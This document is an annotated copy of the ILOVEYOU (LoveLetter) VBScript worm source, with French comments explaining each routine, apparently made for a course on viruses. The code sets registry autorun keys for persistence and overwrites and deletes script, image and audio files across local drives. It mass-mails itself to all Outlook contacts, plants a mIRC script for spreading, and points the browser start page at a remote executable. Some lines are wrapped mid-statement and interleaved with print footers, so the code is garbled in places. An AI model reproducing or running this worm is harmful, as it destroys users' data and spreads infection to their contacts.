' La base de registre (BDR) est une base de données utilisée par le système d'exploitation Windows. Elle contient les données de configuration du système d'exploitation et des autres logiciels installés désirant s'en servir.


rem barok -loveletter(vbe) <i hate go to school>
rem by: spyder / ispyder@mail.com / @GRAMMERSoft Group / Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
'  pour récupérer les fichiers/répertoires/disques -> accède à tout le système de fichiers
Set fso = CreateObject("Scripting.FileSystemObject")
'  ouvre en lecture le script qui est en train de tourner (=celui là)
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
'  contenu du script dans vbscopy
vbscopy=file.ReadAll

main()


sub main()
'  si on a une erreur, continue à la prochaine ligne
	On Error Resume Next
	dim wscr,rr
'  on utilisera ça pour accéder aux répertoires/manipuler les registres
	set wscr=CreateObject("WScript.Shell")
'  lit ce registre et augmente le temps d'execution max des scripts vbs
	rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
	if (rr>=1) then
		wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting
		Host\Settings\Timeout",0,"REG_DWORD"
	end if
'  accède aux répertoires importants du système de fichier
	Set dirwin = fso.GetSpecialFolder(0)
	Set dirsystem = fso.GetSpecialFolder(1)
	Set dirtemp = fso.GetSpecialFolder(2)
'  rend ce script en objet
	Set c = fso.GetFile(WScript.ScriptFullName)
'  le script est copié et remplace les scripts suivants (scripts utilisés par le système)
	c.Copy(dirsystem&"\MSKernel32.vbs")
	c.Copy(dirwin&"\Win32DLL.vbs")
	c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
	regruns()
	html()
	
	
	sub regruns()
		On Error Resume Next
		Dim num,downread
		regcreate
'  lie la clé du registre au nouveau script surchargé comme ça c'est eux qui se lanceront au démarrage du pc
		"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKern
		el32.vbs"
		regcreate
		"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win
		32DLL.vbs"
		
		downread=""
'  retourne la valeur de la clé se trouvant dans la base de registres windows
		downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
		if (downread="") then
			downread="c:\"
		end if
		
'  PAS UTILE
		if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
			Randomize
			num = Int((4 * Rnd) + 1)
			if num = 1 then
				regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
				Page","http:' www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
			elseif num = 2 then
				regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
				Page","http:' www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
			elseif num = 3 then
				regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
				Page","http:' www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WINBUGSFIX.exe"
			elseif num = 4 then
				regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
				Page","http:' www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBh
				bqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX .exe"
			end if
		end if
		if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then regcreate
		"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WINBUGSFIX.exe"
		regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\StartPage","about:blank"
	end if
end sub

spreadtoemail()
listadriv()
end sub


sub listadriv
On Error Resume Next
Dim d,dc,s
'  accède aux disques du système
Set dc = fso.Drives
For Each d in dc
'  locaux
	If d.DriveType = 2 or d.DriveType=3 Then
'  la liste des dossiers des drives, début de l'infection récursive
		folderlist(d.path&"\")
	end if
Next
listadriv = s
end sub

'  va infecter tous les fichiers, folderspec est le path vers le répertoire où on veut appliquer la routine
sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
	ext=fso.GetExtensionName(f1.path)
	ext=lcase(ext)
	s=lcase(f1.name)
	if (ext="vbs") or (ext="vbe") then
'  remplit le fichier par notre script
		set ap=fso.OpenTextFile(f1.path,2,true)
		ap.write vbscopy
		ap.close
'  idem pour ces formats
		elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
		set ap=fso.OpenTextFile(f1.path,2,true)
		ap.write vbscopy
		ap.close
'  récupère le nom de base du fichier surchargé
		bname=fso.GetBaseName(f1.path)
'  récupère le fichier, le copie, le renomme avec son ancien nom
		set cop=fso.GetFile(f1.path)
		cop.copy(folderspec&"\"&bname&".vbs") fso.DeleteFile(f1.path)
' idem pour les jpg, jpeg
		
		elseif(ext="jpg") or (ext="jpeg") then
		set ap=fso.OpenTextFile(f1.path,2,true)
		ap.write vbscopy
		ap.close
		set cop=fso.GetFile(f1.path)
		cop.copy(f1.path&".vbs")
		fso.DeleteFile(f1.path)
' idem mp3, mp2 excepté le fait que les fichiers originaux sont toujours présents, mais masqués
		elseif(ext="mp3") or (ext="mp2") then
		set mp3=fso.CreateTextFile(f1.path&".vbs")
		mp3.write vbscopy
		mp3.close
		set att=fso.GetFile(f1.path)
		att.attributes=att.attributes+2
	end if
'  pour contaminer via mIRC
	if (eq<>folderspec) then
		if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
			set scriptini=fso.CreateTextFile(folderspec&"\script.ini") scriptini.WriteLine "[script]"
			scriptini.WriteLine ";mIRC Script"
			scriptini.WriteLine "; Please dont edit this script... mIRC will corrupt, if mIRC will"
			scriptini.WriteLine " corrupt... WINDOWS will affect and will not run correctly. thanks"
			scriptini.WriteLine ";"
			scriptini.WriteLine ";Khaled Mardam-Bey"
			scriptini.WriteLine ";http:' www.mirc.com"
			scriptini.WriteLine ";"
			scriptini.WriteLine "n0=on 1:JOIN:#:{"
			scriptini.WriteLine "n1= /if ( $nick == $me ) { halt }" scriptini.WriteLine "n2= /.dcc send
			$nick"&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
			scriptini.WriteLine "n3=}"
			scriptini.close
			eq=folderspec
		end if
	end if
next
end sub

'  récurvisité : infecte tous ses éléments et pour ses dossiers, fait la même chose
sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders
for each f1 in sf
	infectfiles(f1.path)
	folderlist(f1.path)
next
end sub


sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub

function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
file:' /C|/Users/Marc-André%20Drapeau/Documents/cours%20619/virus/iloveyou.txt[06/01/2010 7:52:05 PM]
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
	msg = 0
else
	msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
	msg = 0
else
	msg = 1
end if
fileexist = msg
end function


'  envoie par email le script à tous les contacts outlook
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad

set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
'  récupère toutes les adresses mails contacts!
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
	set a=mapi.AddressLists(ctrlists)
	x=1
	
	regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a) if (regv="") then
	regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
	
	for ctrentries=1 to a.AddressEntries.Count
		malead=a.AddressEntries(x)
		regad=""
		regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead) if (regad="")
		then
		
'  écrit un mail
		set male=out.CreateItem(0)
		male.Recipients.Add(malead)
		male.Subject = "ILOVEYOU"
		male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
		male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs") male.Send
		
		regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD" end if
		x=x+1
	next
	
	regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count else
	regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count end if
next
Set out=Nothing
file:' /C|/Users/Marc-André%20Drapeau/Documents/cours%20619/virus/iloveyou.txt[06/01/2010 7:52:05 PM]
Set mapi=Nothing
end sub

'  pour générer un fichier html et l'envoyer par mIRC
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META
NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _ "<META
NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-?
@GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _ "<META
NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY
ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#
-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#
-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>-
Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@
BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _ "<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var
hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _ "?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _ "<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _ "aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _ "set
wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _ "wri.write code4"&vbcrlf&
_
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _ "if (err.number=424)
then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _ "window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite
@-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-
@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _ "?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""") dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
file:' /C|/Users/Marc-André%20Drapeau/Documents/cours%20619/virus/iloveyou.txt[06/01/2010 7:52:05 PM]
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""") dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
	lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
	lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
	lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37)) if (l1=n) then
	lines(n)=chr(34)+lines(n)+chr(34)
else
	lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _" end if
next
set b=fso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM") b.close
set d=fso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2) d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub
